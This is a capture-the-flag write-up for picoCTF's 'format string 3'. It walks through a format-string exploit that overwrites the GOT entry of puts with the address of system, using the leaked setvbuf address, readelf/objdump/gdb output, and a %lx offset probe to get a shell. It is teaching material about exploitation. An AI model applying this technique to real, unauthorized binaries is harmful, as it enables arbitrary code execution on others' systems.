# format string 3 #

## Description ##

This program doesn't contain a win function. How can you win? Download
the binary here. Download the [source
here](format-string-3.c). Download libc here, download the interpreter
here. Run the binary with these two files present in the same
directory.

Additional details will be available after launching your challenge instance.

https://play.picoctf.org/events/73/challenges/challenge/449

## Hints ##

Is there any way to change what a function points to?

## Solution ##

Run executable:

	Howdy gamers!
	Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f1f3c0c83f0
	Hi
	Hi
	/bin/sh

Idea:

Instead of `puts(normal_string)` in line 28, we want to call something like
`system(normal_string)`. As `normal_string` is `'/bin/sh'` this should
give us some access to the flag.


Overwrite the address of `puts()` with the address of `system()`. Both
are in libc, and we can figure out their addresses as the program
gives away the address of `setvbuf()` in libc. This is similar to 
https://blog.pwntools.com/posts/got-overwrite/


Let's find the offsets of the relevant functions in the provided libc:

``` bash
readelf -s libc.so.6 | grep -E ' puts@@| setvbuf@@| system@@'
```

(or use `objdump -T libc.so.6` which prints the dynamic symbol table)

``` comments
  1300: 000000000007a3f0   608 FUNC    WEAK   DEFAULT   16 setvbuf@@GLIBC_2.2.5
  1459: 0000000000079bf0   550 FUNC    WEAK   DEFAULT   16 puts@@GLIBC_2.2.5
  1511: 000000000004f760    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
```

As `puts()` has already been called once when we want to overwrite its
address with that of `system()`, an entry will be available in the
global offset table (GOT) of the process.


So where is the GOT? 

``` bash
objdump -d -j .got.plt format-string-3
```

returns

``` comments
format-string-3:     file format elf64-x86-64


Disassembly of section .got.plt:

0000000000404000 <_GLOBAL_OFFSET_TABLE_>:
  404000:       18 3e 40 00 00 00 00 00 00 00 00 00 00 00 00 00     .>@.............
        ...
  404018:       30 10 40 00 00 00 00 00 40 10 40 00 00 00 00 00     0.@.....@.@.....
  404028:       50 10 40 00 00 00 00 00 60 10 40 00 00 00 00 00     P.@.....`.@.....
```

Use `gdb` to see the entry of the GOT right before `puts()` is called:

``` gdb
b *main+175
r
x /8a 0x404000
```

``` comments
(gdb) b *main+175
Breakpoint 1 at 0x4012f2
(gdb) r
Starting program: /home/kali/tmp/format string 3/format-string-3 
warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7ffff7e5a3f0
ABC
ABC

Breakpoint 1, 0x00000000004012f2 in main ()
(gdb) x /8a 0x404000
0x404000:       0x403e18        0x7ffff7ffe2d0
0x404010:       0x7ffff7fdca10  0x7ffff7e59bf0 <puts>
0x404020 <__stack_chk_fail@got.plt>:    0x401040        0x7ffff7e36250 <printf>
0x404030 <fgets@got.plt>:       0x7ffff7e57d40 <fgets>  0x0
(gdb)
```


So the address of `puts()` on the stack is stored in `0x404018`.
Let's doublecheck the offsets in `calc`:


1. `setvbuf()` is at `0x7ffff7e5a3f0` on the stack and at `0x7a3f0` in `libc`:

		; 0x7ffff7e5a3f0 - 0x7a3f0 
		0x7ffff7de0000

2. `puts()` is at `0x7ffff7e59bf0` on the stack and at `0x79bf0` in `libc`:

		; 0x7ffff7e59bf0 - 0x79bf0
		0x7ffff7de0000

So in order to call `system()` instead of `puts()` we need to write

	addr_of_setvbuf_on_stack - addr_of_setvbuf_in_libc + addr_of_system_in_libc

at `0x404018`. 


If the offset is known, the `fmtstr_payload()` of `pwnlib` can
generate a suitable payload. Let's find the offset:

``` bash
./format-string-3
```

``` comments
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7fdac03ae3f0
3333333.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx
3333333.7fdac050c963.fbad208b.7fffa68584a0.1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.2e33333333333333.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25
/bin/sh
```

The sequence of '3' reappears at position 39, so the offset i 38. Now
all the information is available. The script
[`pwn_format_string_3.py`](pwn_format_string_3.py) automates the
process.

## Learnings ##

* Find the offset (address) of a function in a dynamic library:
  `readelf -s libc.so.6 | grep -E ' puts@@'`
* Find the offset (address) of a function in a dynamic library: 
  `objdump -T libc.so.6`
* Find the global offset table (GOT) in an executable 
  `objdump -d -j .got.plt format-string-3`

